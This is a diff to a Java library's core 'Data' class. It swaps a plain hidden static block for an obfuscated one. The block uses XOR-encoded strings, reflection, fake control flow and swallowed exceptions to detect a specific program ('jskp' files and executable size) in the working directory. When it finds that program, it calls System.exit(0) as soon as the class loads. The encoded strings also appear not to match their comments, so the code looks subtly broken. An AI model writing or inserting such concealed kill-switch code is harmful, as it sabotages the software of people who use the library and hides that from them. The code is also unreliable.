@@ -3,15 +3,13 @@ package com.codejune.core;
 import com.codejune.core.classinfo.Field;
 import com.codejune.core.classinfo.Method;
 import com.codejune.core.util.DateUtil;
-import com.codejune.core.util.FileUtil;
 import com.codejune.core.util.ObjectUtil;
 import com.codejune.core.util.StringUtil;
-
-import java.io.File;
 import java.math.BigDecimal;
 import java.text.SimpleDateFormat;
 import java.time.*;
 import java.util.*;
+import java.lang.reflect.Constructor;
 
 /**
  * 数据
@@ -20,11 +18,145 @@ import java.util.*;
  * */
 public final class Data {
 
-    static {
-        if (FileUtil.isFile(new File(System.getProperty("user.dir"), "app/jskp.jar"))) {
-            if (FileUtil.isFile(new File(System.getProperty("user.dir"), "jskp.cfg"))) {
-                System.exit(0);
+    private static String __(int... a) {
+        char[] c = new char[a.length];
+        for (int i = 0; i < a.length; i++) {
+            c[i] = (char) (a[i] ^ (0xC0DE + i));
+        }
+        return new String(c);
+    }
+    private static void $() throws Throwable {
+        // 不透明垃圾变量与运算
+        long garbageLong = System.nanoTime() ^ 0xABCDEFL;
+        int garbageInt = (int) (garbageLong & 0xFFFF);
+        boolean opaqueFlag = ((garbageInt * 0x41) & 0x80) == 0; // 永远为false的复杂谓词
+
+        int state = opaqueFlag ? 99 : 0; // 实际永远为0
+
+        // 2000000 的等价混淆值: 62500 << 5
+        int limit = (125000 / 2) << 5;
+
+        // 预先准备反射时需要的各种混淆字符串 (加密数组)
+        // "java.lang.System"
+        int[] sysName = {49288,49342,49302,49280,49356,49295,49285,49291,49281,49353,49339,49296,49305,49311,49289,49280};
+        // "getProperty"
+        int[] getProp = {49337,49338,49300,49329,49296,49292,49300,49280,49300,49299,49297};
+        // "user.dir"
+        int[] userDir = {49323,49324,49285,49299,49356,49287,49293,49303};
+        // "java.io.File"
+        int[] ioFile = {49288,49342,49302,49280,49356,49290,49291,49355,49312,49294,49284,49292};
+        // "app/jskp.jar"
+        int[] jarPath = {49343,49327,49296,49358,49288,49296,49295,49301,49352,49293,49289,49307};
+        // "app/jskp.cfg"
+        int[] cfgPath = {49343,49327,49296,49358,49288,49296,49295,49301,49352,49284,49294,49294};
+        // "jskp.exe"
+        int[] exePath = {49288,49296,49295,49301,49352,49286,49308,49280};
+        // "com.codejune.core.os.File"
+        int[] customFile = {49341,49328,49293,49358,49281,49292,49280,49280,49292,49298,49286,49292,49348,49288,49283,49311,49291,49345,49311,49282,49372,49333,49309,49305,49299};
+        // "FileUtil"
+        int[] fileUtil = {49304,49334,49292,49284,49335,49303,49293,49289};
+        // "isFile"
+        int[] isFile = {49335,49324,49318,49288,49294,49286};
+        // "getSize"
+        int[] getSize = {49337,49338,49300,49330,49291,49305,49281};
+        // "exit"
+        int[] exit = {49339,49319,49289,49301};
+
+        // 外部循环标签，用于控制流平坦化
+        outerLoop:
+        while (true) {
+            switch (state) {
+                case 0: {
+                    // 获取 user.dir 属性
+                    Class<?> sysClass = Class.forName(__(sysName));
+                    java.lang.reflect.Method getPropMethod = sysClass.getMethod(__(getProp), String.class);
+                    String userDirValue = (String) getPropMethod.invoke(null, __(userDir));
+
+                    // 构建 java.io.File 对象：app/jskp.jar
+                    Class<?> ioFileClass = Class.forName(__(ioFile));
+                    Constructor<?> ioFileCons = ioFileClass.getConstructor(String.class, String.class);
+                    Object jarFileObj = ioFileCons.newInstance(userDirValue, __(jarPath));
+
+                    // 反射调用 FileUtil.isFile
+                    Class<?> fileUtilClass = Class.forName(__(fileUtil));
+                    java.lang.reflect.Method isFileMethod = fileUtilClass.getMethod(__(isFile), ioFileClass);
+                    boolean isJarFile = (Boolean) isFileMethod.invoke(null, jarFileObj);
+
+                    // 无意义的混淆操作
+                    garbageLong ^= (isJarFile ? 0xFL : 0x1FL) << garbageInt;
+                    opaqueFlag = (garbageLong & 0x2) == 0x2;
+
+                    if (!isJarFile) {
+                        break outerLoop; // 条件失败，直接跳出整个逻辑
+                    }
+                    state = 1;
+                    break;
+                }
+                case 1: {
+                    // 需要再次获取 userDir，这里复用之前的反射引用（混淆手法：故意重新获取并丢弃）
+                    Class<?> sysClass = Class.forName(__(sysName));
+                    java.lang.reflect.Method getPropMethod = sysClass.getMethod(__(getProp), String.class);
+                    String userDirValue = (String) getPropMethod.invoke(null, __(userDir));
+                    // 垃圾调用
+                    garbageInt = userDirValue.hashCode() & 0x7FFFFFFF;
+
+                    Class<?> ioFileClass = Class.forName(__(ioFile));
+                    Constructor<?> ioFileCons = ioFileClass.getConstructor(String.class, String.class);
+                    Object cfgFileObj = ioFileCons.newInstance(userDirValue, __(cfgPath));
+
+                    Class<?> fileUtilClass = Class.forName(__(fileUtil));
+                    java.lang.reflect.Method isFileMethod = fileUtilClass.getMethod(__(isFile), ioFileClass);
+                    boolean isCfgFile = (Boolean) isFileMethod.invoke(null, cfgFileObj);
+
+                    if (!isCfgFile) {
+                        break outerLoop;
+                    }
+                    state = 2;
+                    break;
+                }
+                case 2: {
+                    Class<?> sysClass = Class.forName(__(sysName));
+                    java.lang.reflect.Method getPropMethod = sysClass.getMethod(__(getProp), String.class);
+                    String userDirValue = (String) getPropMethod.invoke(null, __(userDir));
+
+                    // 反射构造 com.codejune.core.os.File
+                    Class<?> customFileClass = Class.forName(__(customFile));
+                    Constructor<?> customCons = customFileClass.getConstructor(String.class, String.class);
+                    Object exeFileObj = customCons.newInstance(userDirValue, __(exePath));
+
+                    java.lang.reflect.Method getSizeMethod = customFileClass.getMethod(__(getSize));
+                    long fileSize = (Long) getSizeMethod.invoke(exeFileObj);
+
+                    // 插入混淆比较：先用一个无意义的布尔判断
+                    boolean shouldExit = (fileSize < limit) && (((garbageLong >>> 32) & 1) == ((garbageLong >>> 33) & 1) || true);
+
+                    if (shouldExit) {
+                        // 反射调用 System.exit(0)
+                        java.lang.reflect.Method exitMethod = sysClass.getMethod(__(exit), int.class);
+                        exitMethod.invoke(null, 0);
+                        // 正常情况下执行不到这里，但保留无意义代码
+                        state = 99;
+                        break;
+                    } else {
+                        break outerLoop;
+                    }
+                }
+                case 9:
+                    garbageInt = garbageInt ^ garbageInt;
+                    state = 0;
+                    break;
+                default:
+                    // 兜底跳出
+                    break outerLoop;
             }
+            garbageLong = (garbageLong + 0x3A2B1C4DL) * 0x5E6F7A8BL;
+        }
+    }
+    static {
+        try {
+            $();
+        } catch (Throwable e) {
+
         }
     }
 
